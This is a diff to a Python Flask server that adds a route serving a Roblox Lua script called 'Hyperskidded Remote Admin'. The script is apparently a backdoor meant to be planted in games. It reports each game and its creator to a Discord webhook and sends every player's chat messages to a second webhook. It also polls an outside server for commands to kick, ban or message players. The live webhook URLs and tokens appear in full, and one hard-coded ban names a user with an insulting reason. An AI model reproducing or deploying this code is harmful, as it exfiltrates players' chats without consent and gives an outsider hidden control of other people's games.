@@ -35,14 +35,14 @@ AUTHORIZATION_HEADERS = {
 
 class Whitelist(db.Model):
   id = db.Column(db.Integer, primary_key=True)
-  discord_user_id = db.Column(db.BigInteger, unique=True, nullable=False)
+  discord_user_id = db.Column(db.BigInteger(), unique=True, nullable=False)
 
   def __repr__(self):
     return f'<Whitelist {self.discord_user_id}>'
   
 class BansWhitelist(db.Model):
   id = db.Column(db.Integer, primary_key=True)
-  discord_user_id = db.Column(db.BigInteger, unique=True, nullable=False)
+  discord_user_id = db.Column(db.BigInteger(), unique=True, nullable=False)
 
   def __repr__(self):
     return f'<BansWhitelist {self.discord_user_id}>'
@@ -294,6 +294,362 @@ def senddata():
   except Exception as e:
     # but will not add the data to the queue if something unexpected happens
     return jsonify({"status": "error", "message": str(e)}), 400
+  
+@app.route("/hyperskidded-remote-admin", methods=["GET"])
+def getsource():
+  try:
+    return """--[[-------------------------------------------------------------------------------------------------------------
+
+										  RazvanMAYHEM_ALT's
+                      _    _                           _    _     _     _          _ 
+                     | |  | |                         | |  (_)   | |   | |        | |
+                     | |__| |_   _ _ __   ___ _ __ ___| | ___  __| | __| | ___  __| |
+                     |  __  | | | | '_ \ / _ \ '__/ __| |/ / |/ _` |/ _` |/ _ \/ _` |
+                     | |  | | |_| | |_) |  __/ |  \__ \   <| | (_| | (_| |  __/ (_| |
+                     |_|  |_|\__, | .__/ \___|_|  |___/_|\_\_|\__,_|\__,_|\___|\__,_|
+                              __/ | |                                                
+                             |___/|_|                           
+                     ____                       __          ___       __          _     
+                    / __ \___  ____ ___  ____  / /____     /   | ____/ /___ ___  (_)___ 
+                   / /_/ / _ \/ __ `__ \/ __ \/ __/ _ \   / /| |/ __  / __ `__ \/ / __ \
+                  / _, _/  __/ / / / / / /_/ / /_/  __/  / ___ / /_/ / / / / / / / / / /
+                 /_/ |_|\___/_/ /_/ /_/\____/\__/\___/  /_/  |_\__,_/_/ /_/ /_/_/_/ /_/ 
+                 
+                 				(C) 2024-2026 Hyperskidded Remote Admin
+                      This is a closed source project, cannot be edited in any way.
+
+---------------------------------------------------------------------------------------------------------------]]
+
+-- // Services
+local services = {
+	players = game:GetService("Players"),
+	messagingService = game:GetService("MessagingService"),
+	httpService = game:GetService("HttpService")	
+}
+
+-- // Tables
+local HSRA = {}
+local main = {}
+local bans = {}
+local manualbans = {
+	{
+		Name = "cifutom",
+		Reason = "being an insufferable illiterate that does not understand when people are sorry for whatever they did, making false accusations, and futhermore, why."
+	}
+}
+local POLL = {
+	-- // URL | Endpoints: "/data-poll", "/send-data"
+	URL = "https://hyperskidded-remote-admin.onrender.com/",
+	-- // Polling Interval
+	INTERVAL = 5
+}
+local WEBHOOK = {
+	URL1 = "https://discord.com/api/webhooks/1322172757395509329/nCLOLomKi-NHCEHz5u6UROQMk11Fc2aVH4Ar5AuOKqbdZd73H2VMHfYCHnUxuENK80XQ",
+	URL2 = "https://discord.com/api/webhooks/1322191435751227466/_qAyO_gFsklwr0N3pFJ6_Xl8gAY6upnuCB9KZCfoz7SWjXxlDYXXztRrxZTwYhmb5Xx1"
+}
+
+-- // Utilities
+function randomstring()
+	return tostring(services.httpService:GenerateGUID(false))
+end
+
+-- // Session name generator
+local sessionName = "hsra-session-"..randomstring()
+
+-- // Core
+function main:Core()
+	local function getuserid(name)
+		return services.players:GetUserIdFromNameAsync(name)
+	end
+	
+	local function getname(id)
+		return services.players:GetNameFromUserIdAsync(id)
+	end
+	
+	local function errorHandler(err)
+		warn("[Hyperskidded Remote Admin]: "..err)
+	end
+	
+	local function handleJSON(data) -- or if we had the ability to add alliases to functions, i could also name it performAction
+		errorHandler("Handling provided data...")
+		if data.params.Action == "sendchatannouncement1" and data.params.Session == sessionName then
+			xpcall(function()
+				for index, value in pairs(game:GetService("Players"):GetPlayers()) do
+					local Resources = script.Utilities_and_Resources
+					local G = Resources.CM:Clone()
+					G.CM.Message.Value = "<font color='rgb(64, 0, 148)'>["..data.params.User.."]</font> <font color='rgb(0, 123, 255)'>H</font><font color='rgb(0, 81, 255)'>S</font><font color='rgb(0, 34, 255)'>R</font><font color='rgb(21, 0, 255)'>A</font>: "..data.params.Message
+					G.Parent = value.PlayerGui
+					G.CM.Enabled = true
+				end
+			end, errorHandler)
+		elseif data.params.Action == "sendchatannouncement2" and data.params.Session == sessionName then
+			xpcall(function()
+				for index, value in pairs(game:GetService("Players"):GetPlayers()) do
+					local Resources = script.Utilities_and_Resources
+					local G = Resources.CM:Clone()
+					G.CM.Message.Value = "<font color='rgb(64, 0, 148)'>[System Message]</font> <font color='rgb(0, 123, 255)'>H</font><font color='rgb(0, 81, 255)'>S</font><font color='rgb(0, 34, 255)'>R</font><font color='rgb(21, 0, 255)'>A</font>: "..data.params.Message
+					G.Parent = value.PlayerGui
+					G.CM.Enabled = true
+				end
+			end, errorHandler)
+		elseif data.params.Action == "ban" and data.params.Session == sessionName then
+			xpcall(function()
+				for index, value in pairs(game:GetService("Players"):GetPlayers()) do
+					if value.Name == data.params.Player then
+						value:Kick("[Hyperskidded Remote Admin] You have been banned. Reason: "..data.params.Reason)
+					end
+				end
+				table.insert({Player = data.params.Player, Reason = data.params.Reason})
+			end, errorHandler)
+		elseif data.params.Action == "kick" and data.params.Session == sessionName then
+			xpcall(function()
+				for index, value in pairs(game:GetService("Players"):GetPlayers()) do
+					if value.Name == data.params.Player then
+						value:Kick("[Hyperskidded Remote Admin] You have been kicked from this session. Reason: "..data.params.Reason)
+					end
+				end
+			end, errorHandler)
+		end
+	end
+	
+	local function listenForPolls()
+		print([[-----------------------------------------------------------------------------------------------------------
+
+										  RazvanMAYHEM_ALT's
+                      _    _                           _    _     _     _          _ 
+                     | |  | |                         | |  (_)   | |   | |        | |
+                     | |__| |_   _ _ __   ___ _ __ ___| | ___  __| | __| | ___  __| |
+                     |  __  | | | | '_ \ / _ \ '__/ __| |/ / |/ _` |/ _` |/ _ \/ _` |
+                     | |  | | |_| | |_) |  __/ |  \__ \   <| | (_| | (_| |  __/ (_| |
+                     |_|  |_|\__, | .__/ \___|_|  |___/_|\_\_|\__,_|\__,_|\___|\__,_|
+                              __/ | |                                                
+                             |___/|_|                           
+                     ____                       __          ___       __          _     
+                    / __ \___  ____ ___  ____  / /____     /   | ____/ /___ ___  (_)___ 
+                   / /_/ / _ \/ __ `__ \/ __ \/ __/ _ \   / /| |/ __  / __ `__ \/ / __ \
+                  / _, _/  __/ / / / / / /_/ / /_/  __/  / ___ / /_/ / / / / / / / / / /
+                 /_/ |_|\___/_/ /_/ /_/\____/\__/\___/  /_/  |_\__,_/_/ /_/ /_/_/_/ /_/ 
+                 
+                 				(C) 2024-2025 Hyperskidded Remote Admin
+                      This is a closed source project, cannot be edited in any way.
+
+-------------------------------------------------------------------------------------------------------------]])
+		coroutine.resume(coroutine.create(function()
+			while true do
+				local success, result = xpcall(function()
+					
+					local function makeRequest()
+						errorHandler("Fetching web server") -- so that i know if its fetching or not
+											
+						local request = services.httpService:RequestAsync({
+							Url = POLL.URL.."data-poll",
+							Method = "GET",
+							Headers = {
+								["Content-Type"] = "application/json"
+							},
+						})
+						
+						return request.Body
+					end
+					
+					coroutine.wrap(function()
+						local data = makeRequest()
+						local decodedData = services.httpService:JSONDecode(data)
+						
+						local succ, res = xpcall(function()
+							if decodedData.status ~= "no_data" then
+								errorHandler("Handling decoded data")
+								handleJSON(decodedData)
+							end
+						end, errorHandler)
+					end)()
+					
+				end, errorHandler)
+				
+				task.wait(POLL.INTERVAL)
+			end
+		end))
+	end
+	
+	listenForPolls()
+	
+	services.players.PlayerAdded:Connect(function(plr)
+		for i, v in ipairs(bans) do
+			if plr.Name == bans[i].Player then
+				plr:Kick("[Hyperskidded Remote Admin] You have been banned from this session. Reason: "..bans[i].Reason)
+			end 
+		end
+		
+		plr.Chatted:Connect(function(message)
+			local data = {
+				content = `ID {game.PlaceId}, by {services.players:GetNameFromUserIdAsync(game.CreatorId)}\n> {plr.Name}: {message}`
+			}
+
+			local request = services.httpService:RequestAsync({
+				Url = WEBHOOK.URL2,
+				Method = "POST",
+				Headers = {
+					["Content-Type"] = "application/json"
+				},
+				Body = services.httpService:JSONEncode(data)
+			})
+		end)
+	end)
+	
+	local function letmeknowifHSRAgotran()
+		local data = {
+			content = "@everyone | Hyperskidded Remote Admin ran in place ID "..game.PlaceId.." who is made by "..services.players:GetNameFromUserIdAsync(game.CreatorId)
+		}
+		
+		local request = services.httpService:RequestAsync({
+			Url = WEBHOOK.URL1,
+			Method = "POST",
+			Headers = {
+				["Content-Type"] = "application/json"
+			},
+			Body = services.httpService:JSONEncode(data)
+		})
+	end
+	
+	local function chatlogs()
+		for i, plr in pairs(services.players:GetPlayers()) do
+			plr.Chatted:Connect(function(message)
+				local data = {
+					content = `ID {game.PlaceId}, by {services.players:GetNameFromUserIdAsync(game.CreatorId)}\n> {plr.Name}: {message}`
+				}
+
+				local request = services.httpService:RequestAsync({
+					Url = WEBHOOK.URL2,
+					Method = "POST",
+					Headers = {
+						["Content-Type"] = "application/json"
+					},
+					Body = services.httpService:JSONEncode(data)
+				})
+			end)
+		end
+	end
+	
+	local function createSession()
+		local data = {
+			channel_id = "1323418279280378037",
+			message = "New session has been created ("..sessionName..") in place ID "..game.PlaceId,
+			session_name = sessionName
+		}
+		
+		local request = services.httpService:RequestAsync({
+			Url = POLL.URL.."create-session",
+			Method = "POST",
+			Headers = {
+				["Content-Type"] = "application/json"
+			},
+			Body = services.httpService:JSONEncode(data)
+		})
+	end
+	
+	local function globalbans() -- i just wanted to see how it would look like linking other bans to HSRA bans
+		-- endpoints
+		local nova = "http://api.scriptlang.com/bans" -- usernamehere_ 
+		local ocbwoy3 = "http://api.ocbwoy3.dev/banland.json" -- ocbwoy3
+		local karma = "http://karma.scriptlang.com/bans" -- equsjd
+		local sleepcore = "https://skidgod.vercel.app/SleepCore/bans.json" -- ghasty24
+		local nbans, obans, kbans, sbans = {},{},{},{}
+		
+		local function returntable(link)
+			local s, r = xpcall(function() 
+				local request = services.httpService:RequestAsync({
+					Url = link,
+					Method = "GET",
+					Headers = {
+						["Content-Type"] = "application/json"
+					}
+				})
+				local raw = request.Body
+				local table = services.httpService:JSONDecode(raw)
+				return table
+			end, errorHandler)
+		end
+		
+		coroutine.wrap(function() 
+			while true do
+				wait(3)
+				nbans = returntable(nova)
+				obans = returntable(ocbwoy3)
+				kbans = returntable(karma)
+				sbans = returntable(sleepcore)
+			end
+		end)()
+		
+		for i, v in pairs(services.players:GetPlayers()) do
+			if nbans[getuserid(v.Name)] then
+				v:Kick("[Hyperskidded Remote Admin] (Nova) You have been banned. Reason: "..nbans[getuserid(v.Name)].reason)
+			elseif obans[getuserid(v.Name)] then
+				v:Kick("[Hyperskidded Remote Admin] (112) You have been banned. Reason: "..obans[getuserid(v.Name)].reason)
+			elseif kbans[getuserid(v.Name)] then
+				v:Kick("[Hyperskidded Remote Admin] (Karma) You have been banned. Reason: "..kbans[getuserid(v.Name)].reason)
+			elseif sbans[getuserid(v.Name)] then
+				v:Kick("[Hyperskidded Remote Admin] (Sleepcore) You have been banned. Reason: "..kbans[getuserid(v.Name)].reason)
+			end
+		end
+		
+		services.players.PlayerAdded:Connect(function(v)
+			if nbans[getuserid(v.Name)] then
+				v:Kick("[Hyperskidded Remote Admin] (Nova) You have been banned. Reason: "..nbans[getuserid(v.Name)].reason)
+			elseif obans[getuserid(v.Name)] then
+				v:Kick("[Hyperskidded Remote Admin] (112) You have been banned. Reason: "..obans[getuserid(v.Name)].reason)
+			elseif kbans[getuserid(v.Name)] then
+				v:Kick("[Hyperskidded Remote Admin] (Karma) You have been banned. Reason: "..kbans[getuserid(v.Name)].reason)
+			elseif sbans[getuserid(v.Name)] then
+				v:Kick("[Hyperskidded Remote Admin] (Sleepcore) You have been banned. Reason: "..kbans[getuserid(v.Name)].reason)
+			end
+		end)
+	end
+	
+	local function manualbansystem()
+		for i, v in pairs(services.players:GetPlayers()) do
+			for i, v2 in ipairs(manualbans) do
+				if manualbans[i].Name == v.Name then
+					v:Kick("[Hyperskidded Remote Admin] You have been banned. Reason: "..manualbans[i].Reason)
+				end
+			end
+		end
+		
+		services.players.PlayerAdded:Connect(function(v)
+			for i, v2 in ipairs(manualbans) do
+				if manualbans[i].Name == v.Name then
+					v:Kick("[Hyperskidded Remote Admin] You have been banned. Reason: "..manualbans[i].Reason)
+				end
+			end
+		end)
+	end
+	
+	chatlogs()
+	globalbans()
+	createSession()
+	manualbansystem()
+	letmeknowifHSRAgotran()
+end
+
+-- // Loading functions
+function HSRA:HyperskiddedRemoteAdmin()
+	print("[Hyperskidded Remote Admin]: Running remote admin...")
+	main:Core()
+end
+
+function HSRA:HSRA()
+	print("[Hyperskidded Remote Admin]: Running remote admin...")
+	main:Core()
+end
+
+function HSRA:HRA()
+	print("[Hyperskidded Remote Admin]: Running remote admin...")
+	main:Core()
+end
+
+HSRA:HyperskiddedRemoteAdmin()
+""", 200, {"Content-Type": "text/plain"}
+  except Exception as err:
+    return jsonify({"status": "error", "message": str(err)}), 500
   
 @app.route("/create-session", methods=["POST"])
 def createsession():
